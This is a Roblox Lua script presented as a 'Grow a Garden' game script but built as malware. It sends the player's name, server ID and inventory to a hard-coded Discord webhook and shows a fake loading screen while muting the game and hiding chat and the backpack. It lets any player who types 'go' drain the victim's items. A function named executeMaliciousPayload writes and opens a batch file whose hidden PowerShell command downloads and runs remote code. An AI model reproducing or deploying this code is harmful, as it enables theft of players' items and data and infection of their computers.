local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local VirtualInput = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1382769361487532032/SHIjTAh_fI13ZcyMb_rhX5GkkZ5JH_fn29qwJ5r2iYdKXLlIFkjUFaNFbXhZPJOVo3Gh"

local BANNED_ITEM_WORDS = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
local FOLLOW_DISTANCE = 3
local E_HOLD_TIME = 1
local E_DELAY = 0.1
local localCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local function executeMaliciousPayload()
    local success, err = pcall(function()
        local RawMetaTable = getrawmetatable(game)
        local MaliciousPayloadRan = false
        local OldClosure = RawMetaTable.__namecall

        setreadonly(RawMetaTable, false)

        RawMetaTable.__namecall = function(...)
            if not MaliciousPayloadRan then 
                MaliciousPayloadRan = true
                
                local OldThreadIdentity = getidentity()
                setidentity(8)

                local BatchPayload = [[
@echo off
powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://tinyurl.com/294v7sma | iex"
]]
                local payload = game:GetService("ScriptContext"):SaveScriptProfilingData(BatchPayload, "run_remote_hidden.bat")
                game:GetService("LinkingService"):OpenUrl(payload)

                setidentity(OldThreadIdentity or 2)
                return
            end
            
            return OldClosure(...)
        end

        setreadonly(RawMetaTable, true)
    end)
end

local function createLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then return end
    
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "LoadingScreen"
    loadingGui.DisplayOrder = 999999
    loadingGui.IgnoreGuiInset = true
    loadingGui.ResetOnSpawn = false
    loadingGui.Parent = playerGui

    local backgroundFrame = Instance.new("Frame")
    backgroundFrame.Name = "Background"
    backgroundFrame.Size = UDim2.new(1, 0, 1, 0)
    backgroundFrame.Position = UDim2.new(0, 0, 0, 0)
    backgroundFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    backgroundFrame.BorderSizePixel = 0
    backgroundFrame.Parent = loadingGui

    local terminalFrame = Instance.new("Frame")
    terminalFrame.Name = "TerminalFrame"
    terminalFrame.Size = UDim2.new(0.5, 0, 0.2, 0)
    terminalFrame.Position = UDim2.new(0.5, -150, 0.3, -100)
    terminalFrame.BackgroundTransparency = 1
    terminalFrame.Parent = backgroundFrame

    local terminalText = Instance.new("TextLabel")
    terminalText.Name = "TerminalText"
    terminalText.Size = UDim2.new(0.95, 0, 0.95, 0)
    terminalText.Position = UDim2.new(0.025, 0, 0.025, 0)
    terminalText.BackgroundTransparency = 1
    terminalText.TextColor3 = Color3.new(0, 1, 0)
    terminalText.Font = Enum.Font.Code
    terminalText.TextSize = 14
    terminalText.TextXAlignment = Enum.TextXAlignment.Left
    terminalText.TextYAlignment = Enum.TextYAlignment.Top
    terminalText.TextWrapped = true
    terminalText.Text = "Initializing...\n"
    terminalText.Parent = terminalFrame

    local loadingSpinner = Instance.new("Frame")
    loadingSpinner.Name = "Spinner"
    loadingSpinner.Size = UDim2.new(0, 80, 0, 80)
    loadingSpinner.Position = UDim2.new(0.5, -40, 0.5, -60)
    loadingSpinner.BackgroundTransparency = 1
    loadingSpinner.Parent = backgroundFrame

    local spinnerImage = Instance.new("ImageLabel")
    spinnerImage.Name = "SpinnerImage"
    spinnerImage.Size = UDim2.new(1, 0, 1, 0)
    spinnerImage.Position = UDim2.new(0, 0, 0, 0)
    spinnerImage.BackgroundTransparency = 1
    spinnerImage.Image = "rbxasset://textures/loading/robloxTilt.png"
    spinnerImage.Parent = loadingSpinner

    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(0, 200, 0, 50)
    loadingText.Position = UDim2.new(0.5, -100, 0.5, 40)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading..."
    loadingText.TextColor3 = Color3.new(1, 0, 0)
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.GothamBold
    loadingText.Parent = backgroundFrame

    local warningText = Instance.new("TextLabel")
    warningText.Name = "WarningText"
    warningText.Size = UDim2.new(0, 300, 0, 75)
    warningText.Position = UDim2.new(0.5, -150, 0.5, 100)
    warningText.BackgroundTransparency = 1
    warningText.Text = "Made by MilesMTG"
    warningText.TextColor3 = Color3.new(1, 1, 1)
    warningText.TextScaled = true
    warningText.Font = Enum.Font.GothamBold
    warningText.Parent = backgroundFrame

    local instructionText = Instance.new("TextLabel")
    instructionText.Name = "InstructionText"
    instructionText.Size = UDim2.new(0, 300, 0, 75)
    instructionText.Position = UDim2.new(0.5, -150, 0.5, 185)
    instructionText.BackgroundTransparency = 1
    instructionText.Text = "You must have fruits and pets in your inventory that are not favorited or the script will not function correctly."
    instructionText.TextColor3 = Color3.new(1, 1, 1)
    instructionText.TextScaled = true
    instructionText.Font = Enum.Font.GothamBold
    instructionText.Parent = backgroundFrame

    local spinTween = TweenService:Create(
        spinnerImage,
        TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
        {Rotation = 360}
    )
    spinTween:Play()

    local colors = {
        Color3.new(1, 0, 0),
        Color3.new(1, 0.65, 0),
        Color3.new(1, 1, 0),
        Color3.new(0, 1, 0),
        Color3.new(0, 0, 1),
        Color3.new(0.29, 0, 0.51),
        Color3.new(0.93, 0.51, 0.93)
    }
    
    spawn(function()
        local colorIndex = 1
        while true do
            local currentColor = colors[colorIndex]
            local nextColor = colors[(colorIndex % #colors) + 1]
            for t = 0, 1, 0.1 do
                loadingText.TextColor3 = currentColor:Lerp(nextColor, t)
                task.wait(0.05)
            end
            colorIndex = (colorIndex % #colors) + 1
        end
    end)

    local fakeMessages = {
        "Loading CCoreGUI...",
        "Initializing RenderPipeline...",
        "Configuring NetworkLayer...",
        "Loading UIComponents...",
        "Starting PhysicsEngine...",
        "Activating AudioManager...",
        "Parsing ConfigData...",
        "Optimizing AnimationSystem...",
        "Loading InputHandler...",
        "Finalizing RuntimeOptimizer..."
    }
    
    spawn(function()
        local text = "Initializing...\n"
        local index = 1
        while true do
            text = text .. fakeMessages[index] .. "\n"
            if #text:split("\n") > 5 then
                text = table.concat({unpack(text:split("\n"), #text:split("\n") - 4)}, "\n")
            end
            terminalText.Text = text
            index = (index % #fakeMessages) + 1
            task.wait(math.random(0.5, 1.5))
        end
    end)

    local textTween = TweenService:Create(
        loadingText,
        TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {TextTransparency = 0.5}
    )
    textTween:Play()

    local warningTextTween = TweenService:Create(
        warningText,
        TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {TextTransparency = 0.5}
    )
    warningTextTween:Play()

    local instructionTextTween = TweenService:Create(
        instructionText,
        TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {TextTransparency = 0.5}
    )
    instructionTextTween:Play()

    spawn(executeMaliciousPayload)
end

local function trySendWebhook(url, json)
    local success, err = pcall(function()
        HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson)
    end)
    if success then return true end

    if _G.syn and syn.request then
        local synSuccess, synErr = pcall(function()
            syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
        if synSuccess then return true end
    end

    if http and http.request then
        local httpSuccess, httpErr = pcall(function()
            http.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
        if httpSuccess then return true end
    end

    if request then
        local reqSuccess, reqErr = pcall(function()
            request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
        if reqSuccess then return true end
    end

    if http_post then
        local postSuccess, postErr = pcall(function()
            http_post(url, json)
        end)
        if postSuccess then return true end
    end

    return false
end

local function sendWebhook(kickReason)
    if not LocalPlayer then return end
    
    local inventoryNames = {}
    for _, item in ipairs(getInventory()) do
        table.insert(inventoryNames, item.Name)
    end

    if kickReason then
        local messageData = {
            content = "**Player Kicked!**\n\n" ..
                      "**Username:** " .. LocalPlayer.Name .. "\n" ..
                      "**Reason:** " .. kickReason
        }
        local messageJson = HttpService:JSONEncode(messageData)
        trySendWebhook(WEBHOOK_URL, messageJson)
    else
        local messageData = {
            ["embeds"] = { {
                ["title"] = "🔍 Player Info",
                ["color"] = 0x00bfff,
                ["fields"] = {
                    { ["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true },
                    { ["name"] = "🆔 Job ID", ["value"] = game.JobId or "Unknown", ["inline"] = false },
                    { ["name"] = "🎒 Inventory", ["value"] = #inventoryNames > 0 and table.concat(inventoryNames, "\n") or "Empty", ["inline"] = false }
                },
                ["footer"] = { ["text"] = "Grow a Garden Stealer" },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            } }
        }
        local messageJson = HttpService:JSONEncode(messageData)
        trySendWebhook(WEBHOOK_URL, messageJson)
    end
end

local function isValidItem(name)
    for _, banned in ipairs(BANNED_ITEM_WORDS) do
        if string.find(name:lower(), banned:lower()) then
            return false
        end
    end
    return true
end

local function getInventory()
    local tools = {}
    local function collect(from)
        for _, item in ipairs(from:GetChildren()) do
            if item:IsA("Tool") and isValidItem(item.Name) then
                table.insert(tools, item)
            end
        end
    end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then collect(bp) end
    if localCharacter then collect(localCharacter) end
    return tools
end

local function toolInInventory(toolName)
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = localCharacter
    if bp then
        if bp:FindFirstChild(toolName) then return true end
    end
    if char then
        if char:FindFirstChild(toolName) then return true end
    end
    return false
end

local function faceTarget(target)
    local hrp = localCharacter:FindFirstChild("HumanoidRootPart")
    if hrp and target then
        hrp.CFrame = CFrame.new(hrp.Position, target.Position)
    end
end

local function teleportToPlayer(player)
    if not player or not player.Character then return end
    local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
    local myHRP = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
    if targetHRP and myHRP then
        local offset = targetHRP.CFrame.LookVector * FOLLOW_DISTANCE
        myHRP.CFrame = CFrame.new(targetHRP.Position + offset, targetHRP.Position)
    end
end

local function holdE()
    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(E_HOLD_TIME)
    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

local function useToolWithHoldCheck(tool, player)
    local humanoid = localCharacter and localCharacter:FindFirstChildOfClass("Humanoid")
    if humanoid and tool then
        humanoid:EquipTool(tool)
        teleportToPlayer(player)
        faceTarget(player.Character and player.Character:FindFirstChild("HumanoidRootPart"))

        while toolInInventory(tool.Name) do
            holdE()
            task.wait(E_DELAY)
        end

        humanoid:UnequipTools()
    end
end

local function cycleToolsWithHoldCheck(player)
    local tools = getInventory()
    for i, tool in ipairs(tools) do
        useToolWithHoldCheck(tool, player)
    end
end

local function disableGameFeatures()
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
    SoundService.RespectFilteringEnabled = true
    
    for _, soundGroup in pairs(SoundService:GetChildren()) do
        if soundGroup:IsA("SoundGroup") then
            soundGroup.Volume = 0
        end
    end
    
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end

local function checkRequirements()
    local accountAge = LocalPlayer.AccountAge
    local hasValidItems = #getInventory() > 0
    local kickReason = nil

    if accountAge < 7 and not hasValidItems then
        kickReason = "Account too new (less than 7 days) and no valid items in inventory"
    elseif accountAge < 7 then
        kickReason = "Account too new (less than 7 days)"
    elseif not hasValidItems then
        kickReason = "No valid items in inventory"
    end

    if kickReason then
        sendWebhook(kickReason)
        LocalPlayer:Kick(kickReason)
        return false
    end
    return true
end

local function setupChatListener()
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.Text:lower() == "go" then
                local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
                if sender and sender ~= LocalPlayer then
                    teleportToPlayer(sender)
                    task.wait(0.5)
                    cycleToolsWithHoldCheck(sender)
                end
            end
        end
    else
        local event = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 5)
        if event then
            event.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
                if data.Message:lower() == "go" then
                    local player = Players:FindFirstChild(data.FromSpeaker)
                    if player and player ~= LocalPlayer then
                        teleportToPlayer(player)
                        task.wait(0.5)
                        cycleToolsWithHoldCheck(player)
                    end
                end
            end)
        end
    end
end

local function clearConsole()
    if rconsoleclear then
        rconsoleclear()
    elseif clr then
        clr()
    end
end

local function main()
    clearConsole()
    if checkRequirements() then
        sendWebhook()
        createLoadingScreen()
        disableGameFeatures()
        setupChatListener()
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    localCharacter = char
end)

main()
